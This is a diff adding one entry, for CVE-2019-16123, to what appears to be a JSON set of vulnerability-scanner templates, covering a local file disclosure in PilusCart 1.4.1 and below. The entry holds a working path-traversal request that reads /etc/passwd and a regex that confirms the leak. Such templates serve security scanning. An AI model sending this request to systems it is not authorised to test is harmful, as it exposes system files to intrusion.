@@ -19449,6 +19449,49 @@
       ]
     },
     {
+      "id": "CVE-2019-16123",
+      "info": {
+        "author": "0x_Akoko",
+        "classification": {
+          "cve-id": "CVE-2019-16123",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-22"
+        },
+        "description": "PilusCart versions 1.4.1 and below suffers from a file disclosure vulnerability.",
+        "name": "PilusCart <= 1.4.1 - Local File Disclosure",
+        "reference": [
+          "https://packetstormsecurity.com/files/154250/PilusCart-1.4.1-Local-File-Disclosure.html",
+          "https://www.cvedetails.com/cve/CVE-2019-16123"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2019,piluscart,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/catalog.php?filename=../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-16278",
       "info": {
         "author": "pikpikcu",
